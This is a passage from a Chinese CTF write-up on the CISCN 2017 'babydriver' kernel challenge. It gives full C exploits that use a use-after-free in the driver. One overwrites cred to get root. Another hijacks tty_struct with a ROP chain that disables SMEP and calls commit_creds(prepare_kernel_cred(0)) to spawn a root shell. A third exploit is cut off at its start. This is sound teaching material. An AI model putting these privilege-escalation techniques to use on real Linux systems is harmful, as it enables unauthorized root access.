cred</code>的大小是一个难点，我并未找到很简单的方法来计算。因为这个结构体里面也有许多的结构体，我觉得直接看源码并不那么容易计算。。。一层套一层，还有对齐的问题。先直接用了，后面再找办法[todolist2]&lt;已解决>，大小为0xa8。<a href=https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118>src</a></p><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp1.c>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd2</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>pid_t</span> <span class=n>pid</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=mh>0x10001</span><span class=p>,</span> <span class=mh>0xa8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>pid</span> <span class=o>=</span> <span class=nf>fork</span><span class=p>())</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>zero</span><span class=p>[</span><span class=mi>36</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=nf>write</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>zero</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>zero</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>getuid</span><span class=p>()</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Fork failed!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>close</span><span class=p>(</span><span class=n>fd2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=exploit2>exploit2<a hidden class=anchor aria-hidden=true href=#exploit2>#</a></h4><p>思路：利用gadgets关闭SMEP，内核没有开启地址随机，直接<code>commit_creds(prepare_kernel_cred(0))</code>，然后跳转到用户程序getshell。</p><p>这里使用覆写<code>tty_struct</code>的方法来获得程序控制流：</p><p><code>tty_struct</code></p><details><summary>struct tty_struct</summary><p>```c
struct tty_struct {
int magic;
struct kref kref;
struct device *dev;
struct tty_driver *driver;
const struct tty_operations *ops; < -- 这里
int index;
/* Protects ldisc changes: Lock tty not pty */
struct ld_semaphore ldisc_sem;
struct tty_ldisc *ldisc;
struct mutex atomic_write_lock;
struct mutex legacy_mutex;
struct mutex throttle_mutex;
struct rw_semaphore termios_rwsem;
struct mutex winsize_mutex;
spinlock_t ctrl_lock;
spinlock_t flow_lock;
/* Termios values are protected by the termios rwsem */
struct ktermios termios, termios_locked;
struct termiox *termiox; /* May be NULL for unsupported */
char name[64];
struct pid *pgrp; /* Protected by ctrl lock */
struct pid *session;
unsigned long flags;
int count;
struct winsize winsize; /* winsize_mutex */
unsigned long stopped:1, /* flow_lock */
flow_stopped:1,
unused:BITS_PER_LONG - 2;
int hw_stopped;
unsigned long ctrl_status:8, /* ctrl_lock */
packet:1,
unused_ctrl:BITS_PER_LONG - 9;
unsigned int receive_room; /* Bytes free for queue */
int flow_change;
struct tty_struct *link;
struct fasync_struct *fasync;
wait_queue_head_t write_wait;
wait_queue_head_t read_wait;
struct work_struct hangup_work;
void *disc_data;
void *driver_data;
spinlock_t files_lock; /* protects tty_files list */
struct list_head tty_files;
#define N_TTY_BUF_SIZE 4096
int closing;
unsigned char *write_buf;
int write_cnt;
/* If the tty has a pending do_SAK, queue it here - akpm */
struct work_struct SAK_work;
struct tty_port *port;
} __randomize_layout;
```</p></details><p><code>struct tty_operations</code></p><details><summary>struct tty_operations</summary><p>```c
struct tty_operations {
struct tty_struct * (*lookup)(struct tty_driver *driver,
struct file *filp, int idx);
int (*install)(struct tty_driver *driver, struct tty_struct *tty);
void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
int (*open)(struct tty_struct * tty, struct file * filp);
void (*close)(struct tty_struct * tty, struct file * filp);
void (*shutdown)(struct tty_struct *tty);
void (*cleanup)(struct tty_struct *tty);
int (*write)(struct tty_struct * tty,
const unsigned char *buf, int count);
int (*put_char)(struct tty_struct *tty, unsigned char ch);
void (*flush_chars)(struct tty_struct *tty);
int (*write_room)(struct tty_struct *tty);
int (*chars_in_buffer)(struct tty_struct *tty);
int (*ioctl)(struct tty_struct *tty,
unsigned int cmd, unsigned long arg);
long (*compat_ioctl)(struct tty_struct *tty,
unsigned int cmd, unsigned long arg);
void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
void (*throttle)(struct tty_struct * tty);
void (*unthrottle)(struct tty_struct * tty);
void (*stop)(struct tty_struct *tty);
void (*start)(struct tty_struct *tty);
void (*hangup)(struct tty_struct *tty);
int (*break_ctl)(struct tty_struct *tty, int state);
void (*flush_buffer)(struct tty_struct *tty);
void (*set_ldisc)(struct tty_struct *tty);
void (*wait_until_sent)(struct tty_struct *tty, int timeout);
void (*send_xchar)(struct tty_struct *tty, char ch);
int (*tiocmget)(struct tty_struct *tty);
int (*tiocmset)(struct tty_struct *tty,
unsigned int set, unsigned int clear);
int (*resize)(struct tty_struct *tty, struct winsize *ws);
int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
int (*get_icount)(struct tty_struct *tty,
struct serial_icounter_struct *icount);
void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
int (*poll_init)(struct tty_driver *driver, int line, char *options);
int (*poll_get_char)(struct tty_driver *driver, int line);
void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```</p></details><p>可以看到<code>tty_struct</code>结构偏移24的地方存放了一个<code>tty_operations</code>结构的指针，这个<code>tty_operations</code>结构都是对tty进行操作的函数指针，可以控制<code>ops</code>指针指向我们可以控制的区域。显然一次函数调用，我们能干的事情很少，所以就使用这一次调用执行stack pivot，ROP来获得持续的控制。</p><p>这里使用write函数调用，在执行到write时，可以发现此时rax指向<code>tty_operations</code>的首地址，所以先在operations中构造rop。（在V1NKe师傅的<a href=https://xz.aliyun.com/t/4529#toc-4>文章</a>中可以发现write是通过<code>call [rax+0x38]</code>调用的。如果一开始，应该怎样找到这个断点地址？[todolist1] &lt;已解决>）</p><p>使用<a href=https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux>extract-vmlinux</a>脚本解压得到内核镜像，再通过ROPgadget或者Ropper获得gadgets。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./extract-vmlinux bzImage &gt; vmlinux
</span></span><span class=line><span class=cl>$ ROPgadget --binary vmlinux &gt; gadgets
</span></span><span class=line><span class=cl>$ ROPgadget --binary vmlinux --opcode 48cf  <span class=c1># search for iretq</span>
</span></span></code></pre></td></tr></table></div></div><p>利用流程：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. 两次打开/dev/babydev设备，ioctl该设备buf为0x2e0   # sizeof(struct tty_struct) = 0x2e0
</span></span><span class=line><span class=cl>2. 在tty_operations上布置rop
</span></span><span class=line><span class=cl>3. 关闭一个babydev，会将buf释放一次，造成UAF
</span></span><span class=line><span class=cl>4. open(&#34;/dev/ptmx&#34;, O_RDWR|O_NOCTTY)将使用刚释放的0x2e0空间存储tty_struct
</span></span><span class=line><span class=cl>5. 改写tty_struct
</span></span><span class=line><span class=cl>6. write触发
</span></span></code></pre></td></tr></table></div></div><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp2.c>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>trap_frame</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>rip</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>cs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>rflags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>rsp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>ss</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>trap_frame</span> <span class=n>tf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define KERNCALL __attribute__((regparm(3)))
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span><span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>prepare_kernel_cred</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xffffffff810a1810</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>commit_creds</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xffffffff810a1420</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>save_status</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>asm</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;mov %cs, tf+8;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;pushfq; popq tf+16;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;mov %rsp, tf+24;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;mov %ss, tf+32;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Status saved!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>get_shell</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>get_root</span><span class=p>()</span>        <span class=c1>// 如果不加返回值，这个函数会被编译成不返回
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>commit_creds</span><span class=p>(</span><span class=nf>prepare_kernel_cred</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>save_status</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>fake_tty_operations</span><span class=p>[</span><span class=mi>30</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>fake_tty</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>rop</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xffffffff810d238d</span><span class=p>,</span>         <span class=c1>// pop rdi ; ret 关闭SMEP
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mh>0x6f0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xffffffff81004d80</span><span class=p>,</span>         <span class=c1>// mov cr4, rdi ; pop rbp ; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>get_root</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xffffffff81063694</span><span class=p>,</span>         <span class=c1>// swapgs ; pop rbp ; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xffffffff814ee0a4</span><span class=p>,</span>         <span class=c1>// opcode: 48 cf iretq
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>tf</span><span class=p>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>get_shell</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=k>struct</span> <span class=n>trap_frame</span><span class=o>*</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>rop</span><span class=p>[</span><span class=mi>8</span><span class=p>])</span> <span class=o>=</span> <span class=n>tf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>30</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>fake_tty_operations</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF8181BFC5</span><span class=p>;</span>            
</span></span><span class=line><span class=cl>        <span class=c1>// 0xFFFFFFFF8181BFC5 : rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// 0xffffffff8181bf7e: ret
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// 这个gadget，ROPgadget搜索结果错误，详见ERROR节
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_tty_operations</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xffffffff8100ce6e</span><span class=p>;</span>                <span class=c1>// pop rax; ret
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_tty_operations</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>rop</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_tty_operations</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF8181BFC5</span><span class=p>;</span>                
</span></span><span class=line><span class=cl>    <span class=c1>// 0xFFFFFFFF8181BFC5 : rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e 
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 0xffffffff8181bf7e: ret
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd2</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=mh>0x10001</span><span class=p>,</span> <span class=mh>0x2e0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd_tty</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/ptmx&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span> <span class=o>|</span> <span class=n>O_NOCTTY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>fake_tty</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_tty</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>fake_tty_operations</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>write</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>fake_tty</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nf>write</span><span class=p>(</span><span class=n>fd_tty</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=exploit3>exploit3<a hidden class=anchor aria-hidden=true href=#exploit3>#</a></h4><p>exp3和exp2很像，差别在于使用了ioctl触发的<code>tty_operations</code>。与write不同，调用ioctl是用的<code>call rax</code>，所以rax中所存储的就是ioctl函数的地址。</p><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp3.c>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ioctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>trap_frame</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>rip</span><span class=p>;</span>
